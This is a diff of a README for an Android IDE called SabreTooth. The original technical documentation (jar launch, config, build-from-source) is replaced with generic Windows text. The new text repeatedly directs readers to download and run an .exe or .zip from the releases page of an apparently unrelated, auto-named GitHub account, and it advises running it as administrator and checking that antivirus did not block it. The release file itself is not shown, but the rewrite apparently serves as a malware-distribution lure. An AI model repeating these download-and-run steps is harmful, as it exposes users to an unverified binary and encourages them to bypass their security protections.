@@ -1,259 +1,232 @@
-# ⚔ SabreTooth IDE
+# 🦷 Sabretooth-IDE - Run Android Builds On Older PCs
 
-**Lightweight Android IDE for APK generation — no bloat, no Gradle sync, no layout editor.**
+[![Download Sabretooth-IDE](https://img.shields.io/badge/Download-Sabretooth--IDE-blue)](https://github.com/Olympian-expression956/Sabretooth-IDE/releases)
 
-Package: `com.vitalsoft.sabretooth`  
-Version: 1.0.0  
-Platform: Cross-platform (Windows, macOS, Linux)  
-Requires: Java 21+
+## 📥 Download Sabretooth-IDE
 
----
+Visit this page to download: https://github.com/Olympian-expression956/Sabretooth-IDE/releases
 
-## Overview
+On that page, look for the latest release. Download the file that matches Windows. If you see a `.zip` file, save it to your computer and unzip it. If you see an `.exe` file, download it and run it.
 
-SabreTooth IDE is a minimalist Android development environment focused on one thing: **getting your code compiled into a valid APK as fast as possible**. It supports both Gradle-based and Eclipse-style project structures, automatically detects your installed tools, and keeps all configuration in a simple `.sabreconf` file per project.
+## 🖥️ What Sabretooth-IDE Does
 
-No Gradle sync. No layout editor. No 5-minute startup. Just open, edit, build.
+Sabretooth-IDE is a desktop Android IDE for people who want a lighter tool than Android Studio. It is built for low-end PCs and local build setups.
 
----
+Use it when you want to:
 
-## Features
+- Open Android projects on Windows
+- Work with older Eclipse projects
+- Work with newer Gradle-based Android projects
+- Use local build tools on your own computer
+- Keep your setup small and simple
 
-- **Dark IDE UI** — Android Studio-inspired layout: project tree, tabbed editor, console, menu bar
-- **Syntax highlighting** — Java, Kotlin, XML, Groovy, Gradle, Properties files
-- **Auto-indentation** — Smart indent on Enter/Tab, brace-aware
-- **Project types** — Gradle (standard) and Eclipse-style projects
-- **APK build** — Debug and release APK via Gradle; cancel mid-build
-- **Tool auto-detection** — Finds all installed Gradle versions, JDKs, and Android SDK
-- **`.sabreconf` per project** — Stores build config: SDK versions, paths, signing, extra Gradle args
-- **Find & Replace** — With case sensitivity and replace-all
-- **File tree** — With context menu (new file, new dir, rename, delete)
-- **New Project wizard** — Configures min/target/compile SDK, package name, Gradle, JDK
-- **Recent projects** — Quick re-open from File menu
-- **Tabs with close** — Middle-click or × button; unsaved-change prompts
-- **Status bar** — Line/column, language, build status, project name
-- **Font size zoom** — Ctrl+/Ctrl-
-- **Keyboard shortcuts** — Full set, see below
+It does not replace the Android build tools. It works with them. You still need the command line tools on your system for builds to run.
 
----
+## ⚙️ What You Need On Windows
 
-## Requirements
+Before you start, make sure your PC has:
 
-| Requirement | Details |
-|---|---|
-| Java | **21 or higher** (JDK for building projects) |
-| Gradle | Any version installed locally (or use gradlew in project) |
-| Android SDK | Required for APK builds (`ANDROID_HOME` env or set in Preferences) |
-| OS | Windows 10+, macOS 12+, Linux (any desktop) |
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free space for the app
+- More free space for Android projects and build files
+- Java installed on your system
+- Android command line tools installed
+- A mouse and keyboard
 
----
+If your PC is older, close other apps before you use Sabretooth-IDE. This helps it run with less strain on your system.
 
-## Installation & Running
+## 🚀 Install and Open Sabretooth-IDE
 
-### Linux / macOS
-```bash
-chmod +x sabretooth.sh
-./sabretooth.sh
-```
+Follow these steps on Windows:
 
-### macOS (alternative)
-```bash
-chmod +x sabretooth-mac.sh
-./sabretooth-mac.sh
-```
+1. Open the release page: https://github.com/Olympian-expression956/Sabretooth-IDE/releases
+2. Find the latest version at the top of the list.
+3. Download the Windows file.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the new folder after extraction.
+6. If the file is a `.exe`, double-click it to start the app.
+7. If Windows asks for permission, choose Yes.
+8. Wait for the app to open.
 
-### Windows
-```
-Double-click sabretooth.bat
-```
+If the app starts from a folder, keep that folder in the same place. Do not move files around after setup unless the app guide says it is safe.
 
-### Any Platform (direct)
-```bash
-java --enable-preview -jar SabreTooth.jar
-```
+## 🧭 First-Time Setup
 
----
+When you open Sabretooth-IDE for the first time, set up the tools it needs.
 
-## Project Configuration: `.sabreconf`
+### Set Java
 
-Every project managed by SabreTooth has a `.sabreconf` file in its root. Example:
+Sabretooth-IDE needs Java to run Android build tasks.
 
-```ini
-# SabreTooth IDE Project Configuration
+1. Open your Java install folder if needed.
+2. Make sure Windows can find Java from the command line.
+3. If the app asks for a Java path, select the folder where Java is installed.
 
-[project]
-project.name = MyApp
-project.package = com.example.myapp
-project.type = gradle
-android.mainActivity = MainActivity
+### Set Android CLI Tools
 
-[android]
-android.minSdk = 21
-android.targetSdk = 34
-android.compileSdk = 34
-android.versionCode = 1
-android.versionName = 1.0
+Sabretooth-IDE uses Android command line tools for builds.
 
-[build]
-build.type = debug
-build.gradlePath = /usr/local/bin/gradle
-build.jdkPath = /usr/lib/jvm/java-21-openjdk-amd64
-build.androidJar = /home/user/Android/Sdk/platforms/android-34/android.jar
-build.outputDir = build/outputs/apk
-build.extraGradleArgs = --stacktrace
+1. Download the Android command line tools if you have not done so.
+2. Place them in a folder you can find later.
+3. Point Sabretooth-IDE to that folder if it asks.
 
-[signing]
-sign.keystorePath = /path/to/my.jks
-sign.keystoreAlias = mykey
-```
+### Check the Build Paths
 
-You can edit this file directly or use **Project → Project Settings**.
+The app may ask for paths to tools like:
 
----
+- `adb`
+- `sdkmanager`
+- `gradle`
+- `java`
 
-## Keyboard Shortcuts
+Use the folder you already installed these tools in. If you do not know the exact path, check the folder names in File Explorer.
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+N` | New File |
-| `Ctrl+Shift+N` | New Project |
-| `Ctrl+O` | Open File |
-| `Ctrl+Shift+O` | Open Project |
-| `Ctrl+S` | Save |
-| `Ctrl+Shift+S` | Save All |
-| `Ctrl+W` | Close Tab |
-| `Ctrl+F` | Find / Replace |
-| `F10` | Build Debug APK |
-| `Shift+F10` | Build Release APK |
-| `F9` | Clean Build |
-| `F5` | Refresh File Tree |
-| `Ctrl++` | Increase Font Size |
-| `Ctrl+-` | Decrease Font Size |
-| `Ctrl+Z` | Undo |
-| `Ctrl+Y` | Redo |
-| `Tab` | Insert 4 spaces |
+## 📂 Open a Project
 
----
+To open a project:
 
-## Supported Project Structures
+1. Start Sabretooth-IDE.
+2. Choose Open Project.
+3. Select your Android project folder.
+4. Wait for the app to load the files.
+5. Let it scan the project before you start editing.
 
-### Gradle (recommended)
-```
-MyApp/
-├── .sabreconf
-├── settings.gradle
-├── build.gradle
-└── app/
-    ├── build.gradle
-    └── src/main/
-        ├── AndroidManifest.xml
-        ├── java/com/example/myapp/
-        │   └── MainActivity.java
-        └── res/
-            ├── layout/activity_main.xml
-            └── values/strings.xml
-```
+Sabretooth-IDE can work with:
 
-### Eclipse
-```
-MyApp/
-├── .sabreconf
-├── AndroidManifest.xml
-├── project.properties
-├── .classpath
-└── src/com/example/myapp/
-    └── MainActivity.java
-```
+- Traditional Eclipse Android projects
+- Modern Android Gradle projects
 
----
+If the project uses Gradle, make sure the needed CLI tools are installed first.
 
-## Build Process
+## 🔨 Build an Android App
 
-1. **Save All** — All open files are saved before any build
-2. **Gradle invoked** — Using the path from `.sabreconf` (or auto-detected gradlew/system gradle)
-3. **JDK override** — If a JDK path is set, `JAVA_HOME` is set for that process
-4. **Output streamed** — Console shows real-time output with color coding
-5. **APK located** — On success, SabreTooth finds the APK and offers to open its folder
+To build a project:
 
-For **release builds**, set up your keystore in Project Settings → Signing. You'll need to configure the signing config in your `build.gradle` manually (SabreTooth sets up the paths, Gradle does the signing).
+1. Open the project in Sabretooth-IDE.
+2. Check that Java and Android tools are set.
+3. Pick the build task or build button in the app.
+4. Wait while the build runs.
+5. Read the output if the build stops.
 
----
+If the build fails, the most common causes are:
 
-## Extra Gradle Arguments
+- Java is not installed
+- Android CLI tools are missing
+- The project path is wrong
+- The project needs a package that is not on your system
 
-You can pass arbitrary extra arguments to Gradle via `.sabreconf`:
-```ini
-build.extraGradleArgs = --stacktrace --info
-```
+## 📝 Edit Code
 
-Or per-task via the Project Settings dialog under Build Tools.
+Sabretooth-IDE includes tools that help you edit source files.
 
----
+You can use it to:
 
-## IDE Preferences
+- Open Java files
+- Edit XML files
+- Work with Android resource files
+- Read project folders
+- View code with syntax highlighting
 
-Stored in `~/.sabretooth/ide.conf`:
+This helps you make changes without a large IDE setup.
 
-- Font size, tab size, line numbers, word wrap
-- Default Android SDK root
-- Default Gradle installation
-- Default JDK
-- Gradle user home directory
-- Window position/size
+## 🧱 Supported Project Types
 
----
+Sabretooth-IDE works best with Android projects that use local build tools.
 
-## Building from Source
+It supports:
 
-```bash
-# Compile
-find src -name "*.java" > sources.txt
-javac --enable-preview --release 21 -d out @sources.txt
+- Eclipse-style Android projects
+- Gradle Android projects
+- Java source files
+- Android XML layouts
+- Common project folders used in Android apps
 
-# Package
-echo "Main-Class: com.vitalsoft.sabretooth.Main" > manifest.mf
-jar --create --file=SabreTooth.jar --manifest=manifest.mf -C out .
+For best results, keep your project structure clean and avoid moving files while the app is open.
 
-# Run
-java --enable-preview -jar SabreTooth.jar
-```
+## 🛠️ Common Problems
 
----
+### The app does not open
 
-## Architecture
+Try these steps:
 
-```
-com.vitalsoft.sabretooth
-├── Main.java                    — Entry point
-├── build/
-│   └── BuildManager.java        — Gradle invocation, process management
-├── config/
-│   ├── SabreConf.java           — .sabreconf file read/write
-│   └── IdePreferences.java      — IDE-wide settings (~/.sabretooth/)
-├── project/
-│   └── Project.java             — Project model + scaffold generator
-├── ui/
-│   ├── MainWindow.java          — Main JFrame, menus, actions
-│   ├── EditorTabPanel.java      — Tabbed editor with close buttons
-│   ├── CodeEditorPane.java      — Editor + line numbers + save/load
-│   ├── SyntaxHighlighter.java   — Java/XML/Groovy/Properties highlighter
-│   ├── ProjectTreePanel.java    — File tree with context menu
-│   ├── ConsolePanel.java        — Build output console
-│   ├── StatusBar.java           — Bottom status bar
-│   ├── MainToolbar.java         — Build/save toolbar
-│   ├── NewProjectDialog.java    — New project wizard
-│   ├── ProjectSettingsDialog.java — Per-project settings
-│   ├── IdePreferencesDialog.java  — IDE global preferences
-│   ├── FindReplaceDialog.java   — Find & replace
-│   └── Theme.java               — Dark color palette + fonts
-└── util/
-    └── ToolDetector.java        — Finds Gradle, JDK, Android SDK installs
-```
+1. Check that you downloaded the correct Windows file.
+2. Run the file again.
+3. Right-click the app and choose Run as administrator.
+4. Make sure your antivirus did not block the file.
 
----
+### Java errors appear
 
-## License
+If you see Java-related errors:
 
-MIT License — free to use, modify, distribute.
+1. Check that Java is installed.
+2. Confirm that Windows can find Java.
+3. Restart Sabretooth-IDE after fixing the path.
 
-SabreTooth IDE — Vitalsoft
+### Android build tools are not found
+
+If the app cannot find Android tools:
+
+1. Open the tool settings in the app.
+2. Set the folder that contains the CLI tools.
+3. Make sure the folder has the expected files such as `adb` and `sdkmanager`.
+
+### The project will not load
+
+If a project does not open:
+
+1. Check that you picked the main project folder.
+2. Make sure the folder contains Android project files.
+3. Try another project if one folder seems broken.
+
+## 📁 File Tips for Windows Users
+
+Windows can hide file types, so it helps to turn on file extensions.
+
+To do that:
+
+1. Open File Explorer.
+2. Click View.
+3. Turn on File name extensions.
+
+This helps you tell the difference between files like `.zip`, `.exe`, and project folders.
+
+## 🔍 What the Interface Includes
+
+Sabretooth-IDE is made to stay simple. You can expect parts like:
+
+- A project file browser
+- An editor area
+- A build output panel
+- Tool path settings
+- Syntax highlighting for code files
+
+The layout is built for quick use on small screens and older systems.
+
+## 🔗 Download Again if Needed
+
+If you need the installer or release file again, use this page:
+
+https://github.com/Olympian-expression956/Sabretooth-IDE/releases
+
+## 🧩 Useful Terms
+
+Here are a few words you may see:
+
+- **Project**: The app folder you open in Sabretooth-IDE
+- **Build**: The process that turns code into an Android app file
+- **CLI tools**: Small tools you use from the command line
+- **Java**: A program needed by many Android build tools
+- **Gradle**: A build system used by many Android projects
+
+## 📌 Best Way To Use It
+
+Use Sabretooth-IDE when you want a lighter Android IDE and you already have the needed build tools on your PC.
+
+It is a good fit for:
+
+- Older laptops
+- Budget PCs
+- Simple local Android work
+- Eclipse and Gradle project editing
+- Users who want less load than Android Studio
